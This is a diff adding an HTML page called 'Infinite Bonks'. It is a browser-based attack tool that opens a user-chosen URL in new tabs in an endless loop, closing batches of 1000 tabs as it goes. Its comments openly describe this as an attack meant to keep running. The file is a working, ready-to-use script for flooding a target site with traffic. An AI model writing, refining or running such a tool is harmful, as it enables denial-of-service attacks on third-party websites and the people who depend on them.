@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<meta charset="UTF-8">
+<title>Infinite Bonks</title>
+
+<head>
+    <style>
+        body {
+            font-family: monospace;
+            text-align: center;
+        }
+
+        body * {
+            font-family: monospace;
+            text-align: center;
+            font-size: 2rem;
+        }
+
+        h1 {
+            font-size: 3rem;
+        }
+
+        h2 {
+            font-style: italic;
+            font-size: 2.5rem;
+        }
+
+        div {
+            padding: 1rem;
+        }
+
+        div * {
+            width: 70%;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>"To Infinity and Beyond!"</h1>
+    <h2>- Buzz Lightyear</h2>
+    <div><input type="text"></div>
+    <div><button onclick="fire();">Go Bonkers!</button></div>
+    <script type="text/javascript">
+        function fire() {
+            var url = document.querySelector('input').value;
+            if (!url) {
+                return;
+            }
+            var win = {};
+            var autoCloseFrequency = 1000; // after opening how many tabs the tool should close them to preserve memory and also give ample amount of time for most of the tabs to load
+            for (var i = 1; i > 0; i++) {
+                win[i] = window.open(url);
+                if (i % autoCloseFrequency === 0) {
+                    // if (confirm(i + `th attack surpassed. Time to Close previous browser tabs to prevent RAM suicide and continue the attack. Click 'OK' to close all tabs if they seem to have loaded. Or just drag out the Attack Tool's Tab to continue the attacks in a fresh Window. You can close previous Window(s) after all the tabs inside have loaded. Will suggest not to click 'Cancel' as the attack will then continue in the same window and cause memory shortage. It's a lengthy message, but worth it.`)) {
+                    for (var j = 1; j <= i; j++) {
+                        try {
+                            win[j].close();
+                            delete win[j];
+                        } catch {
+                            // too lazy to bother about already closed windows, i.e., if delete win[j] fails, which shouldn't...
+                        }
+                    }
+                    // }
+                }
+
+            }
+        }
+    </script>
+</body>
+
+</html>
